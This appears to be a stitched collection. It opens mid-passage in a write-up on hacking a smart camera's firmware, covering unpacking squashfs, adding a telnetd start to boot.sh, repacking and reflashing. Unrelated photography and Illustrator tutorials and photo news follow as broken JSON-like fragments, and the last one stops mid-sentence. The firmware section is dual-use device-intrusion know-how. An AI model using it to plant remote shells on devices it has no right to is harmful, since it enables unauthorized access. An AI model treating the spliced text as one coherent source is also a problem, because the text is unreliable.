the kernel image file and the zImage is an image compression file of the kernel. \nAs for uImage, it is an image file dedicated to u-boot. It adds a 64-byte header in front of zImage to indicate the kernel version, loading location, generation time, size and other information. After 0x40 , there is no difference with zImage. \nThe firmware uses the squashfs file system, a set of GPL open source read-only compressed file systems for the Linux kernel. Therefore, the firmware cannot be modified when the device is running normally. In the previous section, the reason why we entered the system through the serial port by modifying the initial process of the kernel is that the system has not been initialized and we gained read and write rights to the file system. \nIn the latter part of the firmware, there is an area that can be written. A JFFS2 file system, which is a very widely used read/write file system on flash memory. Modified configuration information and other data during device operation will be written to this file system. \nThe squashfs file system starts at 0x3800000 and is 6963644 bytes in size. Extract the file system with the dd command and decompress it with the unsquashfs command. \n4.3 Unlock the New Function \nBe familiar with file system structure and existing commands. \nObviously, the firmware Shell is based on busybox . From the result of file instruction, we can judge that the camera is a 32-bit ARM instruction architecture. \nThis busybox is statically linked and does not rely on other library files. You can use qemu-arm directly to simulate the running. \nOf course, we can also build a qemu virtual machine. \nDownload qemu virtual machine image file and launch the virtual machine as follows. \nNow we can determine that the telnetd command exists on the target file system. Add the following content at the end of the boot.sh file in the root directory to enable the device to automatically start the Telnet service on startup. \n4.4 Reseal \nHaving finished the simple modification of the file system, so how do we repackage the firmware so that it can flash back to the device? \nStart with the firmware structure again as follows: \nWhat we customize is only the middle part of the file system, which is the 0x3100000 - 0xB00000 . At the same time, the length of this segment is not equal to the size of the squashfs file system, which is 6963644 bytes. There is a 0xff padding portion from the end of the squashfs file system to the beginning of the next segment. \nAs can be seen from the uImage header, the image size is 2217456 , while the squashfs file system starts at 3670016 . There is no CRC check for the squashfs file system. \nJudging from the above conclusions, we only need to repackage the modified file system into firmware without changing the original firmware structure. \nConnect each segment with cat . \n4.5 Brush Back \nWe've finished the repackage. Use the programmer to brush the modified firmware offline into the firmware memory chip. \n4.6 Outcome \nAs you can see, we successfully turned on the telnet service for this camera. \n0x05 Conclusion \nA good understanding of the hardware and software of smart devices is the basis for exploring the device vulnerabilities.

      "title": "Global and Local Luminance Masking in Lightroom",
      "text": "I have often wanted to carry out global adjustments in Lightroom which target specific luminosity values in an image. Lately, I have discovered a way of achieving this. It is not as precise as, for instance, luminosity masking or blend-if masking in Photoshop, but yet it has the power to give an image that extra punch many of us are looking for in our editing. \nThis is the straight-out-of-camera version of the image we will be working with, shot in July in Romsdalen, Norway. \nFirst I start out in my regular fashion working the tones and colors until I am reasonably happy with how things look. Next, I zoom out so that I can encircle the image with the Radial Filter. Since I want the filter to affect the entire image I set the feathering to zero. \nNeedless to say perhaps that after setting the first global radial we can exit the radial filter, resize the image to the working size we prefer and then return to the radial filter. \nFirst I would like to do some adjustments to the highlights using the Radial Filter sliders. The adjustments will affect the entire image until I click on Range Mask which is located below the various sliders. I opt for the Luminance feature and while pressing down Alt/Opt I move the left slider towards the right. The left slider protects the shadows whereas the right slider protects the highlights. \nBy holding down Alt/Opt when moving the sliders Lightroom offers a mask which reveals what is going on. In regular fashion, it is a black and white mask where white reveals and black conceals. \nIn other words, the adjustments will have the greatest effect on the white parts of the image. \nBy right-clicking on the center of the radial filter a new pop menu shows up and I click Duplicate. I double click on \u201cEffect\u201d to zero out everything and also remember to reset the Luminance Range sliders. \nI now carry out some adjustments having the darker parts of the image in mind. However, now while pressing down Alt/Opt I move the right Luminance Range mask slider towards the left protecting the highlights. \nI also would like to add some midtones contrast. I carry out the adjustments which seem pleasing to me, and next I move both Luminance Range mask sliders towards the middle. \nChecking the \u2018Show Luminance Mask\u2019 option provides us with a red overlay mask. I prefer to use the masks as illustrated above. \nLightroom also offers a color mask option when we use the local adjustment tools (brush, gradient, radial). I use that mask with great care owing to the fact that it may leave us with edge halos if we push things too far. \nBelow the Luminance Range mask sliders, we find \u201cSmoothness\u201d. That slider also responds to holding down Alt/Opt so that it is possible to see what happens through a mask when moving the slider. \nAssume I would like to enhance some of the highlights in the sky either using the radial filter or the brush tool. After having carried out my adjustments I make sure to protect the darker parts of the sky using the left Range mask slider. \nNext, I begin moving the Smoothness slider while pressing down Alt/Opt. To further refine the mask I also play around with the Feathering slider. The mask adjustments resulted in a surprisingly precise mask. \nWhen using masks to refine and constrict adjustments our original adjustments will lose some of their strength. I then often duplicate the adjustment whether it is the brush, radial filter or the gradient tool to achieve the effect I am after. \nIt is, of course, possible to reverse the order of things; first, determine the mask and then carry out the adjustments, and then further fine-tune the mask if necessary. \nBelow is the finished image edited in its entirety in Lightroom by applying both global and local adjustments controlled by Luminance masks. \nAbout the author : Ole Henrik Skjelstad is a landscape photographer and math teacher from Norway.

      "title": "How To Composite a Car onto a New Background in Photoshop",
      "text": "As I outlined in one of my recent video tutorials , I\u2019ve been using car photography as a creative outlet lately. It\u2019s a great opportunity to combine my hobbies of Photoshop, photography, and driving my Ford Mustang into one fun activity! In today\u2019s tutorial I\u2019ll share my photo editing process and explain how I take a basic car photograph and transform it into an inspiring automotive portrait by compositing a new background and blending the car with its new environment, using a variety of techniques in Adobe Photoshop. \nCompositing a new background dramatically transforms a bland and boring setting into a much more visually appealing location that can help enhance the mood or atmosphere you want to achieve with the photo. These two photographs were both taken on the same empty road, but with the magic of some Photoshop editing, one is now set in a cold mountainous region, and the other in an exotic metropolis! \nThese Photoshop compositing techniques can be applied to all kinds of photo subjects, but they are particularly effective for automotive photography. Whilst cars are a relatively easy subject to work with, reflections are the biggest factor that determines the suitability for a composition. Using a Circular Polarising Filter on your camera can reduce the majority of reflections in the car body and windows, but any leftovers can either be edited out using Photoshop\u2019s stamping tools, or incorporated into the theme of the new environment. For instance, this photo has a warped reflection of a building along the side of the car, but it will complement the new city location. \nDownload the image from your camera and make any necessary post-processing adjustments to correct the overall tone and colour balance. \nIn order to place the car onto a new background, it first needs clipping out. Use the Pen tool to trace around the car outline, staying a couple of pixels away from the edge to avoid capturing any slithers of the backdrop in the selection. \nRoughly create the path along the bottom of the car, then follow the outline to the starting point to form a continuous path. \nRight click and choose Make Selection, then Copy and Paste the clipping of the car onto a new layer. \nA new background can now be pasted between the original Background layer and the new car clipping. The new scenery photo must have been taken at a similar angle and resemble the lighting of the scene. This image of a Road In The City by Jimmy Yan on Shutterstock features a road receding into the distance in the same direction as my original photograph, and the area is shaded just like the initial location. \nTo accurately match the angle of the scenes, reduce the opacity of the new background layer and move it into position so the horizon lines overlap. \nThe compositing process becomes much easier if the original road is preserved in the final edit, since the car is already realistically positioned with the correct shading and angle. Apply a Layer Mask to the new scenery layer and begin painting with a soft black brush in the mask to erase the foreground to bring back the original road. \nKerbs or sidewalks are convenient features of almost every road photograph that can be used as a seam to blend the two backgrounds. Adjust the size of the brush and use the X key to switch between black and white to erase and restore the mask. \nThe new background will need some adjustments to make the composition more realistic. First convert the layer to a Smart Object so any filters are applied non-destructively, so they can be edited if necessary. \nToggling off the new background layer to compare it with the original shows a difference in the depth of field. The elements in the background of the original image are considerably blurry, whilst the stock photograph was taken with a much smaller aperture. \nMake a mental snapshot of the blur amount from the camera image, then toggle back the visibility of the layer and go to Filter > Blur Gallery > Field Blur. \nIncrease the Blur value to mimic the depth of field effect of the original image. Typically this will be a relatively small value of under 10px. \nThe Blur Gallery filters have some additional tools that are useful for matching the appearance of the two photographs. The car shows some subtle ISO noise, whereas the background is much cleaner. Increase the Grain Amount slider to simulate some noise in the background too. \nThe car was clipped around its outline, but the area within the window still shows the original backdrop. Apply a layer mask and use the brush tool to erase the unwanted portion to reveal the correct background. Using a moderate hardness setting for the brush tip helps avoid an unrealistic hard edge. \nThe area through the glass wouldn\u2019t be so bright and clear, so draw a path around the window with the Pen tool and make a selection. \nAdd a new layer, then fill the selection with a colour sampled from the nearby window. Change the blending mode of the layer to Multiply to allow the background to show through. \nReduce the opacity of the window overlay layer until the background looks like it is being realistically viewed through glass. \nViewing the image up close shows the car with an unrealistically hard edge from where it has been clipped with the Pen tool. Select the car layer, then activate the Blur tool. \nReduce the strength of the tool to around 50-70% in the toolbar, then using a small brush, paint around the edge of the vehicle to simulate the natural lens blur. The edges farthest away require more blurring than the foreground. \nA great way to finish off an image with some natural color grading and lighting effects is using my free light leak overlays . Open one or more files then copy and paste them into the document and scale them to size. Change the blending mode to Screen to make the dark background invisible, allowing the colourful portion to interact with the image. \nReduce the opacity of the layer to adjust the impact of the overlay. Layering up overlays can add some vibrant light casts across the image. \nThe final result is a much-improved photograph with stunning background scenery that enhances the atmosphere of the picture. Preserving the original road ensures the car remains grounded realistically on the asphalt, then subtle lens blur and ISO noise effects match the visual traits of the new stock photograph with the original image. \nThe post How To Composite a Car onto a New Background in Photoshop appeared first on Spoon Graphics .",

      "text": "Buffalo Bills quarterback had his blurry selfie hung in a prestigious art gallery \nDecember 20, 2019 by Dunja Djudjic Leave a Comment \nBuffalo Bills quarterback Josh Allen managed to do what many photographers dream of. He recently had his photo hung at a prestigious art gallery. But the thing that adds a bit of a comedy element to the whole story is that the photo is a selfie . And a pretty blurry one. \nJosh snapped a selfie when he got off a plane after his team\u2019s win against the Pittsburgh Steelers. It was 2 am and very cold outside, yet the team\u2019s fans (the \u201cBills Mafia\u201d) showed up and cheered. Now that\u2019s fandom! Josh was apparently happy to see this, so he took one fan\u2019s phone and took a selfie with the crowd. \nIt\u2019s 2 am, 25 degrees, and #BillsMafia still showed out! pic.twitter.com/3B5w2okK4m \n\u2014 Buffalo Bills (@BuffaloBills) December 16, 2019 \nThe fan posted two Josh\u2019s selfies on Twitter, one sharp and one blurry: \n\u2014 Ali Abbas (@aliiabbas_) December 16, 2019 \nThis is where it gets funny. Twitter user @stephietweets posted the blurry selfie with a request for Albright-Knox gallery in Buffalo to hang it up: \nHang this up in the @AlbrightKnox . pic.twitter.com/eNj2Q0TqRJ \n\u2014 x-Playoff Bound, 2019 (@stephietweets) December 16, 2019 \nAnd so they did: \n\u2014 Albright-Knox (@AlbrightKnox) December 17, 2019 \nI must admit that my first thought was that this is a joke. But it looks like it\u2019s not: \nThat\u2019s certainly better than a banana duct taped to a wall \n\u2014 x-Baby Yoda is a Bills Fan (@JimHavJr) December 17, 2019 \nThe tweet from the Albright-Knox gallery sparked a lot of comments, mainly wholesome and humorous ones. And this one is my absolute favorite: \nThe @AlbrightKnox wasn't kidding folks. It's real. I've got your #MostBuffalo story coming up in a few. I know that's @KateWelshofer 's jam at the end of the show, but it's Tuesday\u2026anything can happen. @WGRZ pic.twitter.com/yJQXogOtbk \n\u2014 Nate Benson (@natebenson) December 17, 2019 \nI think that this story shows just how far the appreciation for sports stars can go. And I find it utterly amusing, wholesome, and funny. But it also shows the power of social media and how a single tweet can, apparently, turn a football player into an exhibited artist in just a few days. \nToo bad they chose the blurry photo, though. \n[via FStoppers ]",

      "text": "Fujifilm will not be at Photokina 2020, reports say \nDecember 12, 2019 by Dunja Djudjic Leave a Comment \nIt\u2019s official that Nikon, Leica, and Olympus will not be attending Photokina in May 2020 . However, judging from the recent reports, Fujifilm is also bailing out. \nWhen Photokina announced that Nikon, Leica, and Olympus will not attend the upcoming show, there was no word on Fujifilm. However, Fuji Rumors had a tip that Fujifilm will not be present. The show has already been left without some of the major exhibitors, and it\u2019s all pretty sad. \nYou might remember that in 2017 Photokina became an annual event . Then, to everyone\u2019s shock, the 2019 Photokina was canceled and rescheduled for May 2020. And since then, a couple of major manufacturers have announced that they won\u2019t be exhibiting at the show. \nFirst, there was a rumor that Canon, Elinchrom, and Profoto would pull out from Photokina 2020. It turned out that Profoto and Canon will be at the upcoming event, but Elinchrom confirmed that we won\u2019t see them at the show. And as I mentioned, Nikon, Leica, and Olympus have also canceled their participation. For now, Fujifilm is only rumored to bail out of the show, but we\u2019ll get in touch with the company to confirm this. We will update the article if we hear back. \n[via Fuji Rumors ]",

      "text": "In this tutorial, we\u2019ll go over how to create a storefront icon, simply by using rectangles, Illustrator Effects, and gradients. This icon is great for use in e-commerce sites, and the techniques in this tutorial can easily be applied to other icons, illustrations, and logos. \nFinal image: simple storefront icon \nReady to create a storefront icon for your own shop or design? Below is the final vector we will be illustrating. \nTutorial details: how to create a storefront icon \nProgram: Adobe Illustrator CS4 \u2013 CC \nDifficulty: Beginner / Intermediate \nTopics Covered: Rectangle Tool, Gradients, Bulge Warp \nEstimated Completion Time: 30 min \u2013 1 hour \nStep 1 \nIn order to create a storefront icon, first begin a new document and make a rectangle with the Rectangle tool (M). Keep this rectangle about half as long as it is tall. Within the rectangle, create two more rectangles. One will be the window and the second will be a door. \nStep 2 \nSelect all the rectangles and go Object > Path > Offset. In the Offset dialog, change the Offset to -5 px. This value might be different depending on the the original size of your rectangles. \nStep 3 \nSelect your main store shape and fill it with a gray color. Select the offset of the main store shape a fill it with a radial gradient from the Gradient panel. Change the first color stop in the radial gradient to a light gray and the second color stop to a gray slightly lighter than the main store shape color. \nStep 4 \nSelect both the main window and door shapes as you create your storefront icon, and go ahead and fill them with a dark gray. \nNext, select the offset window and door shapes and fill them with a linear gradient. Change the first swatch in the linear gradient to a gray lighter then the original window and door shapes and the second swatch a darker gray then the original window and door shapes. \nChange the angle to 90 from the Gradient panel. \nStep 5 \nSelect both the window and door offsets and go Object > Path > Offset. In the Offset dialog, change the Offset to -5 px. \nChange the fill of the new offset to a radial gradient with the first color stop a light cyan color and the second color stop to a darker cyan color. \nStep 6 \nSelect both the new offsets and Copy (Command + C) and Paste in Front (F). \nStep 7 \nWith the Rectangle tool (M), create a rectangle about one half the width of the door. With the Selection tool (V), hold the Shift key and rotate the rectangle 45 degrees. \nPlace the rotated rectangle over the top right side of the door. Select the cyan door copy and the rectangle and press the Intersect button from the Pathfinder panel. \nStep 8 \nFill the new intersected shape with a linear gradient and change both color stops to white. \nSelect the first white color stop and change the Opacity 45 and change the second white color stop\u2019s opacity to 0 from the Gradient panel. \nStep 9 \nRepeat steps 7 and 8 for the window. \nStep 10 \nCreate a thin rectangle slightly wider then the main store shape and place right below the main store shape. Fill the new rectangle with the same linear gradient as the first offset window and door shapes. \nAdjust the gradient with the Gradient tool (G) from top to bottom so the lighter part of the gradient is at the top of the rectangle. \nStep 11 \nCreate another rectangle about one fourth the height of the previous one you made, and place it inside the previous rectangle. Fill the new rectangle with a linear gradient. \nFor this gradient, we need to add another color stop. Simply click right below the center of the Gradient Slider in the Gradient panel. \nNow that there are three color stops, fill the first with the same lighter gray as the previous rectangle, the second color stop white, and the third the same gray as the first color stop. \nStep 12 \nWhen you create a storefront icon, the trick is to add small, realistic touches. In this step, we\u2019ll add a subtle window apron to make your illustration pop. \nTo add the apron, create another thin rectangle, fill it will the same gradient as the sidewalk, and place below it the window. \nStep 13 \nTo add some life to our store vector, we can create a simple sign for the window. Start by typing out some text and change the font size to fit within the window. \nCreate a rectangle slightly bigger than your text and go Object > Arrange > Send Backward (Command + [ ). Fill the rectangle in with a linear gradient. Make the first color stop red and the second a dark red. \nAdjust the gradient so the lighter part of it is at the top of the rectangle. Next, fill the text in with white. \nTo complete the sign, select the text and rectangle, slightly rotate it with the Selection tool (V), and place over the window. \nStep 14 \nTo add just a little more panache, create a small rectangle and fill it with a dark grate color for the door handle. \nStep 15 \nNow on to the store awning (since we can\u2019t create a storefront without a colorful awning!) \nMake a rectangle that is a little taller than the main door shape, half the width of the door, and fill it with red. With the new rectangle selected, go Effect > Stylize > Round Corners. \nIn the Round Corners dialog, change the Radius to 20 px. Like your offsets, this might be bigger or smaller depending on the size of your building. Next, go Object > Expand Appearance. \nCreate a rectangle to cutoff the top rounded corners of the rectangle, select both shapes, and press the Minus Front button from the Pathfinder panel. \nStep 16 \nWith the Selection tool (V) hold down the Shift key and the Alt / Option key (Shift constrains movements and Alt / Option copies) and drag a copy of the red shape to the right side of the original. \nChange the fill of the the copy to a light gray. Select both shapes and drag out copies like you just did, making sure they line up with the right side of the gray shape. \nAgain, select all the shapes (you should have a total of four) and drag out a copy to the right of the last shapes. You should now have a total of eight shapes. \nWhen dragging out the copies, I like to have Smart Guides enabled ( Command U). Having smart guide activated will snap objects together when editing the shapes, making it a lot easier. (For more info on Smart Guides, check my quick tip The Power of Smart Guides .) \nStep 17 \nYou\u2019re over halfway to knowing how to create a storefront icon vector of your very own! Your next step is selecting all the awning shapes and group the objects (Object > Group). \nThen go Effects > Warp > Bulge. In the Warp Options dialog, check Vertical, Change the bend to 40, Horizontal Distortion to 0, and the Vertical Distortion to 28. Next, go Object > Expand Appearance. \nStep 18 \nSelect the red shapes and fill them with a linear gradient. Add two color stops to the gradient so you have a total of four. \nChange the first color stop to red, the second to lighter red, the third to red, and the last on to a dark red. With the Gradient tool (G) adjust the gradient from top to bottom. \nIn the gradient panel, change the Location of the third color swatch to 80 and the location of the second color stop to 55. \nStep 19 \nSelect the gray shapes in the awning and repeat the previous steps, but change the first color stop to a light gray, the second to white, third to light gray, and the fourth to gray. Place all the awning shapes over the top of the store. \nStep 20 \nSelect the main store body shape, Copy (Command C ), and Paste in Front (Command + F). Select all the awning shapes, Copy (Command C ), and Paste in Back (Command + B). \nWith the shapes still selected, move them down slightly and Group (Command G) them together. \nSelect the copied awning shapes and the copied building shape, hold down the Alt / Option key, press the Intersect button from the Pathfinder panel, and then press the Expand button from the Pathfinder panel. \nFill the new shape with a linear gradient, with the first color stop being a light gray color and the second a darker gray color. Adjust the gradient with the Gradient tool (G), so the light part of the gradient is at the bottom. \nStep 21 \nSelect the bottom two long, thin rectangles, Copy (Command + C) and Paste (Command + V). Move the copies to the top of the awning and scale them horizontally, matching the top width of the awning shapes. \nStep 22 \nCreate an ellipse a little wider than your main store shape with the Ellipse tool (L). Fill this with a radial gradient, change the first color stop to black, and then change the second to white. \nSquish the ellipse with the Selection tool (V) to about an eighth of its original size, and place it behind and toward the bottom of the artwork. Set the Blending Mode of the ellipse to Multiply from the Transparency panel, and you are all done! \nTake a deep breath, because you just learned to create a storefront icon. \nAwesome job! You now know how to create a storefront icon. \nNow that you\u2019ve learned to create a storefront icon of your very own, you can use this vector illustration for banners, websites, and much more. \nThese icons link to social bookmarking sites where readers can share and discover new web pages.",

      "text": "Want to get started in macro photography but don\u2019t have much to spend? There are ways to jump into the niche using mostly the gear you already have (assuming you don\u2019t have a dedicated macro lens). Here\u2019s an 8-minute video by NatureTTL that\u2019ll point you in the right direction. \nIn the video, professional landscape, wildlife, and macro photographer Ross Hoddinott shares thrifty ways to both shoot and light macro photos. \nFirst, Hoddinott explains how you can use your existing lens for macro photos by buying a close-up filter for the front, an extension tube for the rear, or a reversing ring for mounting a lens back-to-front on your camera. These options may run you around $100 or less depending on which product you purchase. \nFor lighting macro photos, one technique Hoddinott recommends is reflecting natural light onto subjects. You can do this by simply wrapping some cardboard with aluminum foil to create a reflective surface. \nFinally, you can also add more light to a shot using a cheap LED light. \nWatch the video above to hear Hoddinott explain these techniques in more detail and demonstrate how they\u2019re done.",

Head over to File > New (or by using the Control-N keyboard shortcut), and adjust it as follows: \nNumber of Artboards: 1 \nWidth: 64 px \nHeight: 64 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nAs soon as we\u2019ve finished setting up our project file, we can start working on the actual coding icon.

Position at a distance of 8 px from the center of the Artboard \u2019s bottom edge. \nStep 3 \nAdd the stand\u2019s upper body using a 12 x 8 px rectangle, which we will color using #666666 and then stack on top of the previous shape. \nStep 4 \nCreate the monitor\u2019s lower body using a 56 x 4 px rectangle ( #999999 ) which we will stack on top of the stand, making sure to horizontally center align them to one another. \nStep 5 \nAdd the screen using a taller 56 x 32 px rectangle, which we will color using #666666 and then position as seen in the reference image . \nStep 6 \nCreate the stand\u2019s upper head using an 8 x 2 px rectangle, which we will color using #999999 and then stack on top of the monitor\u2019s screen. Once you\u2019re done, make sure you select and group all of the device\u2019s composing shapes using the Control-G keyboard shortcut. \nStep 7 \nNext, I\u2019m going to let you get a little creative, and assign you with the task of tinkering with the little \u201ccoding lines\u201d. Using the reference image as your main guide, create a couple of 1 px tall rectangles ( #ffffff ) with different Width values. Make sure to select and group ( Control-G ) all of them together once you\u2019re done, doing the same for the entire monitor afterward. \nStep 8 \nAt this point we\u2019re pretty much done working on the monitor. We can shift our focus over to the phone, and create the main shape for its dock using a 16 x 4 px rectangle ( #666666 ), which we will position as seen in the reference image . \nStep 9 \nAdd the connectivity indicator led using a 4 x 2 px rounded rectangle with a 1 px Corner Radius , which we\u2019re going to color using #b0dd85. Then, position the rectangle to the center of the dock. Once you have the shape in place, make sure you select and group the two together using the Control-G keyboard shortcut. \nStep 10 \nCreate the main shape for the visible section of the phone\u2019s screen using a 12 x 20 px rectangle ( #e6e6e6 ), which we will adjust by opening up the Transform panel. Then, set the Radius of its top corners to 2 px from within the Rectangle Properties input fields. Take your time and once you\u2019re done, position the resulting shape on top of the dock. \nStep 11 \nAdd the little notch using a smaller 4 x 1 px rectangle ( #666666 ) which we will adjust by setting the Radius of its bottom corners to 1 px. Center align the resulting shape to the upper edge of the phone\u2019s screen. \nStep 12 \nFinish off the phone and with it the project itself, by adding the little \u201ccoding lines\u201d using a couple of 1 px tall rectangles ( #666666 ), positioning them as seen in the reference image. Make sure to select and group ( Control-G ) all of them together afterward. Once you\u2019re done, don\u2019t forget to select and group ( Control-G ) all of the phone\u2019s composing shapes, doing the same for the entire coding icon before finally hitting that save button. \nGreat Work! \nAs always, I can only hope you had fun creating this coding icon. Most importantly I hope you managed to learn something new and useful during the process. \nThat being said, if you have any questions feel free to post them within the comments section and I\u2019ll get back to you as soon as I can! \nAuthor: Andrei \u0218tefan \nJust another coffee addict / pixel grinder, creating colorful projects one pixel at a time. \nThe post How to Create a Coding Icon in Adobe Illustrator appeared first on Vectips .",

      "title": "How to create the \u201cCorona\u201d lighting effect on your subjects",
      "text": "I\u2019m just gonna come clean here and say that I just made up the name \u2018corona\u2019 for this lighting setup. In fact, the word corona is a commonly used term with solar eclipses. During an eclipse, we can often see the moon silhouetted against a ring of light and the word corona is often used to describe that halo of light we see around the moon. \nAs we explain this lighting, my reasoning for calling this setup \u2018corona\u2019, should start to make a bit more sense because we are actually trying to achieve a similar lighting eclipse look by adding a ring of light around our subject. \nHumble Beginnings \nConfused? I promise you won\u2019t be. In fact, this setup is actually a scaled-up version of a simple still life setup I was playing with over 20 years ago. The basic premise involves a large light source behind the subject, but instead of a pure white light behind them, we actually introduce a large flag (black card) behind them. This flag is specifically made slightly smaller than the light source it is covering so that when it\u2019s placed between the subject and light source, a small amount of light is allowed to creep around it thus just lighting the edges of the object. \nHere are my Ilford award winning images from back in 1998 using the simple lighting technique to light the edges of these cans. \nBut wait, the setup gets even easier than that! I often have to shoot some product shots to go with an article or interview etc. Instead of me going into the studio and setting all of the lights up, I\u2019ve often just turned the TV on and put a black piece of card behind my object as you can see below. I choose a white image on the TV and then the television itself becomes my light source as the white light creeps around the black card to perfectly light the edges of my product. \nHere you can see I have my product in front of my TV with a black card between them. A simple setup, but a very effective result. \nBut is it scalable? \nNo, I\u2019m not referencing your bank manager questioning your new business loan, I am in fact talking about scaling up this lighting setup. \nOne issue we have with this setup is the fact that the light behind the object needs to be considerably larger than it is. This is fine when we\u2019re lighting a lens or wine bottle, but when the object is now a person, we struggle to find a light source large enough to cover it. \nOf course, one option here is to find a giant window to stand in front of\u2026. if you have that, then you\u2019re done. For those of us not living in Georgian townhouses with floor to ceiling windows, we need to find another option. And let\u2019s not forget that we also need a giant black flag to put behind our subject too. Thankfully that\u2019s pretty easy so let\u2019s start there. \nGiant Black Flag \nIf you\u2019ve been following my tips and techniques for any period of time then I know you know what I\u2019m about to say next. That\u2019s right, it\u2019s time to get out your big sheets of black velvet! \nI\u2019m always preaching about how vital these large sheets of black velvet are and once again they will be vital to the success of this shot. If you\u2019re not familiar, I use these large sheets of black velvet all the time as flags and they are especially useful on location when you don\u2019t have access to large studio poly boards to block and manage the light. \nNo idea what a \u2018crab clamp\u2019 is? \nI like to carry at least two sheets of 1m x 2m black velvet with me and if I need to set them up, I simply attach a crossbar to the top of a light stand via a \u2018crab clamp\u2019, then clip the back velvet to that to create a large wall of darkness to block any unwanted light bounce. \nIf you\u2019re shooting on location then these large sheets of black velvet are vital to block any unwanted light on set. \nGiant Light\u2026 \nPerfect. We have our giant black flag, now we just need a giant light source. This is probably where you think you can\u2019t continue, right? Sure you can pick up a sheet of black velvet for a few quid, but a giant light?! Probably a little out of your budget, right? Well, thankfully that\u2019s where you\u2019re wrong because if we\u2019re clever with our light, we don\u2019t actually need a huge light at all. \u2026but you will need a couple of white walls. \nThis next step is actually a bit tricky to explain with text alone, so now let\u2019s look at the lighting setup in situ and hopefully that will do a better job explaining how this is going to work. \nIn the image above, we have our large sheet of black velvet behind our subject (shown here as a blackboard). Behind that, we have a strobe with an open reflector dish firing away from the velvet and into a white wall. The resulting light from this is bouncing around and going everywhere. In fact, it\u2019s actually starting to creep around the edges of our black velvet and falling onto the model. Now you should start to see how this setup is starting to work. \nAdding Some Colour \nBut now let\u2019s add our coloured front light. Take a look at the diagram below to see where everything is placed. \nIn the above shot, you\u2019ll see that I\u2019ve just added a large softbox to the set and that\u2019s positioned behind me and shining straight onto the model. This large softbox is also equipped with a blue gel, but don\u2019t panic you don\u2019t need a giant gel to do that, you simply need to open the softbox up and place the gel over the flash tube. \nGelling a large softbox is easier than you might think. No, you don\u2019t have patchwork small gels to the front of it, nor do you have to buy giant rolls of gels. Simply open up your softbox and place your gel over the flash tube. Note: Be wary of your modelling bulb getting too hot. Either remove it or turn it off. \nWhat Should it Look Like? \nAs you might have guessed, this is not your regular \u201810:01 YouTube lighting setup\u2019! This setup is a little unorthodox in its approach as we\u2019ll be throwing a lot of light around a room to get this to work. On top of that, we\u2019re also shining colour directly onto our subject and the only white light in the shot is really only hitting the edges of our subject. \nSo how do we set this up? What \u2018should\u2019 it look like? Below I\u2019m going to share a couple of raw images from the setting up process as I turned one of the two lights on at a time and took a shot to get an idea of what\u2019s actually going on. \nIn this image, we can see what the shot looks like with just the white light behind the model on. \nIn this shot, we\u2019ve turned off the backlight and no we just have the blue front light on instead. \nIn the above images, you should start to see how the shot is coming together. In the image of the white light on only, you should see how the edges are brighter, yet the front of the subject is far darker. It is in these darker shadow areas that we can add a coloured gel. \nIn the image of the blue light only, you should now see that the light falls off so as to make the edges of the subject fairly dark. With both of these lights combined, you start to get both the colour on the front, yet the edges have a subtle light glow to them. When you\u2019re setting this up, I recommend turning on each of these lights individually and try to get a similar look to mine from each of them. \nFinal Results \nWith our setup in place and the lights correctly adjusted, here\u2019s what some of the resulting images looked like. \nSo no questions then? \nI\u2019m pretty sure that if I listen carefully, I can hear you screaming, \u2018BUT HOW DID YOU GET FROM THAT TO THAT?!\u2019 \nThis is the point at which I remind you that you\u2019re following the work of a photographer (AKA an artist). A photographer that has very little regards for the \u2018rules\u2019 of image-making. I mention this as I know many will want to know exactly what I did to get to these results I\u2019ve shown above, but be warned, I took certain liberties when taking these shots as well as when I processed them. \nFirst off, I deliberately underexposed these images at the point of capture. The main reason for that was due to the edge light. It\u2019s deceptively bright at the edges and even though I underexposed them, I\u2019m still losing detail in the fur on the edges. Next, I wanted to lean into one special property that I\u2019ve not yet discussed; the styling. \nConsider your Styling \nIn these images, styling is minimal, but what we do have is still very important. I mentioned my thought process with the fur and my concerns with not clipping the highlights on the fur, but we also have this lingerie to consider. The outfit is made from fluorescent fabric and fluorescent fabric has some very unique properties we need to be mindful of, especially with regards to colour lighting. \nFluorescence \nFluorescent fabric bounces light in a very unique way, in fact, many of us immediately know when something is \u2018fluorescent\u2019, but what are its properties that we are immediately recognising? Think back to any fluorescent product and consider for example, what\u2019s different about a piece of fluorescent green paper compared to normal green paper? Well, the fluorescent green one appears just brighter right? Same with orange, pink or yellow and so on. There are very scientific reasons for this, including how much heat energy they\u2019re bouncing and why that\u2019s happening etc. etc. But for now, I\u2019ll just say that fluorescents bounce back a huge amount of light and that light is incredibly consistent resulting in it not having many shadow areas and more importantly, it does an extremely good job of maintaining its own colour, regardless of what colour is actually being shone onto it. This is why fluorescent objects appear so bright to us, they simply bounce huge amounts of light and they do so whilst maintaining their colour. Think of a hi-vis jacket, no matter what colour light we shine onto, it always returns that brilliant white light. \nFluorescent colours have a will of their own and no matter what colour you actually shine onto them, they pretty much ignore it and maintain their original colour. \nSo back to the image. Here I am shining blue light onto the orange fluorescent fabric, but it doesn\u2019t care. The model\u2019s skin is now blue, but the fluorescent fabric carries on just being orange. As a result, this fabric appears to almost leap off of the page in contrast, especially when we chose to shine darker coloured lights like blue onto them. It\u2019s with this knowledge that we can now start to manipulate a shot with a little more intent. \nPost-Production \nThis article has gone on long enough, so I won\u2019t bore you further with the post-pro process, but I will touch on a few key decisions I made. Firstly, I mentioned that I wanted to lean into the fluorescent colour look, so in post I decided to push the whole image to that pinky, orange colour. I actually did this by adding a lot of magenta to the \u2018tint\u2019 via the white balance. Remember, that the only white light in this shot is the edge lights. By pushing the tint in this way, the image now looks like it was shot with pink edge lights, yet our highlights are still white. \nIn the images above you can see the process, I went through from raw to Lightroom and finally Photoshop. From this, you should first see just how strong that fluorescent colour is in the raw, especially when you consider how there is really only blue light lighting it. Secondly, you can see just much I\u2019ve pushed the white balance so as to really accentuate that orange outfit. \nYes, there is a lot that has gone here, but the basic principle is simple skin retouching and colour toning. That\u2019s it. It looks like a big change, but in reality, that\u2019s all that\u2019s happened here. Yes, I could have taken the time to go into my camera and create a custom white balance that pushed the magenta tint, but I knew I was shooting in raw and I was content to make that change later on. \nClosing Comments \nThis is a VERY simple setup. \nIt\u2019s only two lights for a start. Plus it doesn\u2019t require any expensive or fancy modifiers. The beauty of this setup comes from the fact that we are shooting with intent from the beginning. We are purposefully underexposing to watch those highlights and 